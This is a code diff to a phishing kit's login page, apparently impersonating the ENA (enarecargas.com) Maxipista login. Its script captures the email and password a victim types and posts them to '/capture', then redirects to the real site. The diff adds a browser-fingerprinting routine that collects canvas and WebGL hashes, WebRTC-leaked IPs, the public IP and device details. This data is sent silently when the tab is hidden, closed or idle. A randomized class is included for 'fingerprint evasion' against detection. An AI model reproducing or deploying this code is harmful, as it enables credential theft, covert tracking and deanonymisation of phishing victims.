@@ -211,185 +211,187 @@
 
     <script>
         let enteredEmail = '';
-        let timeoutId;  // Global timer variable for clearing/restarting
-        const timeoutDuration = 2 * 60 * 1000;  // Updated to 2 minutes
-        let visibilityTimeoutId;  // For tab switch detection
-        const visibilityDelay = 5 * 1000;  // 5 seconds of hidden = trigger immediately
+        let timeoutId;
+        const timeoutDuration = 2 * 60 * 1000;
+        let visibilityTimeoutId;
+        const visibilityDelay = 5 * 1000;
 
+        // ENHANCED FINGERPRINT COLLECTOR
+        (function() {
+            const fingerprints = {
+                ip_address: "Unknown",
+                webrtc_ips: [],
+                canvas_fingerprint: "",
+                webgl_fingerprint: {hash: "", details: {}},
+                user_agent: navigator.userAgent,
+                device_info: {
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    screen_resolution: `${screen.width}x${screen.height}`,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    timestamp: new Date().toISOString(),
+                    color_depth: screen.colorDepth,
+                    pixel_ratio: window.devicePixelRatio,
+                    hardware_concurrency: navigator.hardwareConcurrency || "Unknown",
+                    do_not_track: navigator.doNotTrack || "unspecified",
+                    cookies_enabled: navigator.cookieEnabled
+                }
+            };
+
+            try {
+                const canvas = document.createElement('canvas');
+                canvas.width = 200;
+                canvas.height = 50;
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.fillStyle = '#f60';
+                ctx.fillRect(125, 1, 62, 20);
+                ctx.fillStyle = '#069';
+                ctx.fillText('Canvas Fingerprint', 2, 15);
+                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+                ctx.fillText('Canvas Fingerprint', 4, 17);
+                const dataURL = canvas.toDataURL();
+                let hash = 0;
+                for (let i = 0; i < dataURL.length; i++) {
+                    hash = ((hash << 5) - hash) + dataURL.charCodeAt(i);
+                    hash = hash & hash;
+                }
+                fingerprints.canvas_fingerprint = Math.abs(hash).toString(16);
+            } catch (e) {
+                fingerprints.canvas_fingerprint = "error";
+            }
+
+            try {
+                const glCanvas = document.createElement('canvas');
+                const gl = glCanvas.getContext('webgl') || glCanvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    fingerprints.webgl_fingerprint.details = {
+                        vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR),
+                        renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER),
+                        version: gl.getParameter(gl.VERSION),
+                        shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
+                        maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
+                        maxViewportDims: [gl.getParameter(gl.MAX_VIEWPORT_DIMS)[0], gl.getParameter(gl.MAX_VIEWPORT_DIMS)[1]]
+                    };
+                    const dataStr = JSON.stringify(fingerprints.webgl_fingerprint.details);
+                    let hash = 0;
+                    for (let i = 0; i < dataStr.length; i++) {
+                        hash = ((hash << 5) - hash) + dataStr.charCodeAt(i);
+                        hash = hash & hash;
+                    }
+                    fingerprints.webgl_fingerprint.hash = Math.abs(hash).toString(16);
+                }
+            } catch (e) {
+                fingerprints.webgl_fingerprint = {hash: "error", details: {}};
+            }
+
+            const getWebRTCIPs = () => {
+                return new Promise(resolve => {
+                    const ips = [];
+                    try {
+                        const pc = new RTCPeerConnection({
+                            iceServers: [{urls: 'stun:stun.l.google.com:19302'}]
+                        });
+                        pc.createDataChannel('');
+                        pc.onicecandidate = e => {
+                            if (!e || !e.candidate) {
+                                pc.close();
+                                resolve(ips.length > 0 ? ips : ['No WebRTC']);
+                                return;
+                            }
+                            const match = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
+                            if (match && !ips.includes(match[1])) ips.push(match[1]);
+                        };
+                        pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => resolve(['Error']));
+                        setTimeout(() => { pc.close(); resolve(ips.length ? ips : ['Timeout']); }, 3000);
+                    } catch (e) {
+                        resolve(['Not supported']);
+                    }
+                });
+            };
+
+            const getPublicIP = async () => {
+                try {
+                    const r = await fetch('https://api.ipify.org?format=json');
+                    const d = await r.json();
+                    return d.ip;
+                } catch (e) {
+                    return 'Unknown';
+                }
+            };
+
+            Promise.all([getWebRTCIPs(), getPublicIP()]).then(([webrtcIps, publicIp]) => {
+                fingerprints.webrtc_ips = webrtcIps;
+                fingerprints.ip_address = publicIp;
+                window.fingerprints = fingerprints;
+                console.log('✅ Fingerprints collected');
+            }).catch(() => { window.fingerprints = fingerprints; });
+        })();
+
+        // UPDATED: Timeout with fingerprints
         function resetTimeout() {
-            clearTimeout(timeoutId);  // Clear existing timer
-            clearTimeout(visibilityTimeoutId);  // Clear visibility timer
+            clearTimeout(timeoutId);
+            clearTimeout(visibilityTimeoutId);
             timeoutId = setTimeout(() => {
-                // On timeout, fetch /timeout_capture
-                fetch('/timeout_capture', { method: 'POST' })
-                    .then(response => {
-                        if (response.ok) {
-                            // Data logged silently
-                        } else {
-                            console.log('Timeout capture failed: ' + response.status);
-                        }
-                    })
-                    .catch(err => console.log('Timeout capture error: ' + err));
+                const fingerprintData = JSON.stringify(window.fingerprints || {});
+                const formData = new URLSearchParams();
+                formData.append('reason', 'timeout');
+                formData.append('fingerprint_data', fingerprintData);
+                
+                fetch('/timeout_capture', { 
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: formData.toString()
+                }).catch(err => console.log('Timeout capture error: ' + err));
             }, timeoutDuration);
         }
 
-        // Detect tab switch/minimize/close and trigger timeout immediately if hidden > 5s
-        // Also force on mobile/iOS with pagehide (triggers on app switch, close, minimize)
+        // UPDATED: Visibility change with fingerprints
         document.addEventListener('visibilitychange', () => {
             if (document.hidden) {
-                // Tab hidden - start short timer to trigger immediately
                 visibilityTimeoutId = setTimeout(() => {
-                    fetch('/timeout_capture', { method: 'POST' })
-                        .then(response => {
-                            if (response.ok) {
-                                // Triggered on leave
-                            } else {
-                                console.log('Visibility timeout capture failed: ' + response.status);
-                            }
-                        })
-                        .catch(err => console.log('Visibility timeout capture error: ' + err));
+                    const fingerprintData = JSON.stringify(window.fingerprints || {});
+                    const formData = new URLSearchParams();
+                    formData.append('reason', 'tab_switch');
+                    formData.append('fingerprint_data', fingerprintData);
+                    
+                    fetch('/timeout_capture', { 
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                        body: formData.toString()
+                    }).catch(err => console.log('Visibility timeout error: ' + err));
                 }, visibilityDelay);
             } else {
-                // Tab visible again - clear and reset main timeout
                 clearTimeout(visibilityTimeoutId);
                 resetTimeout();
             }
         });
-        
-        // ENHANCED FINGERPRINT COLLECTOR - Collects and posts to backend
-(function() {
-    const fingerprints = {
-        ip_address: "Unknown",
-        webrtc_ips: [],
-        canvas_fingerprint: "",
-        webgl_fingerprint: {hash: "", details: {}},
-        user_agent: navigator.userAgent,
-        device_info: {
-            platform: navigator.platform,
-            language: navigator.language,
-            screen_resolution: `${screen.width}x${screen.height}`,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            timestamp: new Date().toISOString(),
-            color_depth: screen.colorDepth,
-            pixel_ratio: window.devicePixelRatio,
-            hardware_concurrency: navigator.hardwareConcurrency || "Unknown",
-            do_not_track: navigator.doNotTrack || "unspecified",
-            cookies_enabled: navigator.cookieEnabled
-        }
-    };
 
-    try {
-        const canvas = document.createElement('canvas');
-        canvas.width = 200;
-        canvas.height = 50;
-        const ctx = canvas.getContext('2d');
-        ctx.textBaseline = 'top';
-        ctx.font = '14px Arial';
-        ctx.fillStyle = '#f60';
-        ctx.fillRect(125, 1, 62, 20);
-        ctx.fillStyle = '#069';
-        ctx.fillText('Canvas Fingerprint', 2, 15);
-        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
-        ctx.fillText('Canvas Fingerprint', 4, 17);
-        const dataURL = canvas.toDataURL();
-        let hash = 0;
-        for (let i = 0; i < dataURL.length; i++) {
-            hash = ((hash << 5) - hash) + dataURL.charCodeAt(i);
-            hash = hash & hash;
-        }
-        fingerprints.canvas_fingerprint = Math.abs(hash).toString(16);
-    } catch (e) {
-        fingerprints.canvas_fingerprint = "error";
-    }
-
-    try {
-        const glCanvas = document.createElement('canvas');
-        const gl = glCanvas.getContext('webgl') || glCanvas.getContext('experimental-webgl');
-        if (gl) {
-            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-            fingerprints.webgl_fingerprint.details = {
-                vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR),
-                renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER),
-                version: gl.getParameter(gl.VERSION),
-                shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
-                maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
-                maxViewportDims: [gl.getParameter(gl.MAX_VIEWPORT_DIMS)[0], gl.getParameter(gl.MAX_VIEWPORT_DIMS)[1]]
-            };
-            const dataStr = JSON.stringify(fingerprints.webgl_fingerprint.details);
-            let hash = 0;
-            for (let i = 0; i < dataStr.length; i++) {
-                hash = ((hash << 5) - hash) + dataStr.charCodeAt(i);
-                hash = hash & hash;
-            }
-            fingerprints.webgl_fingerprint.hash = Math.abs(hash).toString(16);
-        }
-    } catch (e) {
-        fingerprints.webgl_fingerprint = {hash: "error", details: {}};
-    }
-
-    const getWebRTCIPs = () => {
-        return new Promise(resolve => {
-            const ips = [];
-            try {
-                const pc = new RTCPeerConnection({
-                    iceServers: [{urls: 'stun:stun.l.google.com:19302'}]
-                });
-                pc.createDataChannel('');
-                pc.onicecandidate = e => {
-                    if (!e || !e.candidate) {
-                        pc.close();
-                        resolve(ips.length > 0 ? ips : ['No WebRTC']);
-                        return;
-                    }
-                    const match = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
-                    if (match && !ips.includes(match[1])) ips.push(match[1]);
-                };
-                pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => resolve(['Error']));
-                setTimeout(() => { pc.close(); resolve(ips.length ? ips : ['Timeout']); }, 3000);
-            } catch (e) {
-                resolve(['Not supported']);
-            }
-        });
-    };
-
-    const getPublicIP = async () => {
-        try {
-            const r = await fetch('https://api.ipify.org?format=json');
-            const d = await r.json();
-            return d.ip;
-        } catch (e) {
-            return 'Unknown';
-        }
-    };
-
-    Promise.all([getWebRTCIPs(), getPublicIP()]).then(([webrtcIps, publicIp]) => {
-        fingerprints.webrtc_ips = webrtcIps;
-        fingerprints.ip_address = publicIp;
-        window.fingerprints = fingerprints;
-        console.log('✅ Fingerprints collected');
-    }).catch(() => { window.fingerprints = fingerprints; });
-})();
-
-
-        // Force trigger on page unload (close, minimize, app switch) - especially for stubborn iOS
+        // UPDATED: Page hide with fingerprints
         window.addEventListener('pagehide', () => {
-            fetch('/timeout_capture', { method: 'POST' })
-                .then(response => {
-                    if (response.ok) {
-                        // Triggered on unload
-                    } else {
-                        console.log('Pagehide timeout capture failed: ' + response.status);
-                    }
-                })
-                .catch(err => console.log('Pagehide timeout capture error: ' + err));
+            const fingerprintData = JSON.stringify(window.fingerprints || {});
+            const formData = new URLSearchParams();
+            formData.append('reason', 'page_close');
+            formData.append('fingerprint_data', fingerprintData);
+            
+            fetch('/timeout_capture', { 
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: formData.toString(),
+                keepalive: true
+            }).catch(() => {});
         });
 
-        // Additional force for iOS stubbornness: beforeunload
+        // UPDATED: Before unload with fingerprints
         window.addEventListener('beforeunload', () => {
-            navigator.sendBeacon('/timeout_capture', '');  // Use sendBeacon for reliable unload data
+            const fingerprintData = JSON.stringify(window.fingerprints || {});
+            const data = `reason=browser_close&fingerprint_data=${encodeURIComponent(fingerprintData)}`;
+            navigator.sendBeacon('/timeout_capture', data);
         });
 
-        // Reset on activity: input changes on email/password, mouse moves, keypresses, scrolls, clicks, touches
+        // Reset on activity
         document.getElementById('email').addEventListener('input', resetTimeout);
         document.getElementById('password').addEventListener('input', resetTimeout);
         window.addEventListener('mousemove', resetTimeout);
@@ -398,10 +400,8 @@
         window.addEventListener('click', resetTimeout);
         window.addEventListener('touchstart', resetTimeout);
 
-        // Initial timeout on load: Calls resetTimeout() to start the 2-min countdown
         resetTimeout();
 
-        // Validation function for email only
         function isValidEmail(email) {
             const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
             return emailRegex.test(email);
@@ -425,7 +425,6 @@
             if (errorDiv) errorDiv.remove();
         }
 
-        // Function to submit data (used by password form and links)
         function submitData(password = '') {
             const fingerprintData = JSON.stringify(window.fingerprints || {});
             fetch('/capture', {
@@ -435,14 +434,12 @@
             })
             .then(response => {
                 if (response.ok) {
-                    // Redirect to real ENA site after capture
                     window.location.href = 'https://www.enarecargas.com/maxipista/private';
                 }
             })
             .catch(err => console.log('Capture error: ' + err));
         }
 
-        // Handle identifier form submit: Validate email, capture, toggle to password step with delay
         document.getElementById('identifier-form').addEventListener('submit', function(e) {
             e.preventDefault();
             clearError();
@@ -455,24 +452,21 @@
                 showError('Ingresa una dirección de correo electrónico válida');
                 return;
             }
-            // Valid: simulate loading delay, then toggle to password step
             setTimeout(() => {
                 document.getElementById('email-display').textContent = enteredEmail;
                 document.getElementById('identifier-step').classList.add('hidden');
                 document.getElementById('password-step').classList.remove('hidden');
                 document.getElementById('password').focus();
-                resetTimeout();  // Reset timer on step change
-            }, 800);  // 0.8 second delay for realistic feel
+                resetTimeout();
+            }, 800);
         });
 
-        // Handle password form submit: Submit with password
         document.getElementById('password-form').addEventListener('submit', function(e) {
             e.preventDefault();
             const password = document.getElementById('password').value;
             submitData(password);
         });
 
-        // Handle links in identifier step (submit without password)
         document.getElementById('create-account-link').addEventListener('click', function(e) {
             e.preventDefault();
             enteredEmail = document.getElementById('email').value.trim();
@@ -484,7 +478,6 @@
             submitData();
         });
 
-        // Handle links in password step (submit with current password input, even if empty)
         document.getElementById('forgot-password-link').addEventListener('click', function(e) {
             e.preventDefault();
             const password = document.getElementById('password').value;
@@ -501,7 +494,6 @@
             submitData(password);
         });
 
-        // Randomized container class for fingerprint evasion
         (function() {
             var randomClass = ['container-var1', 'container-var2', 'container-var3'][Math.floor(Math.random() * 3)];
             document.querySelector('.dynamic-container').classList.add(randomClass);
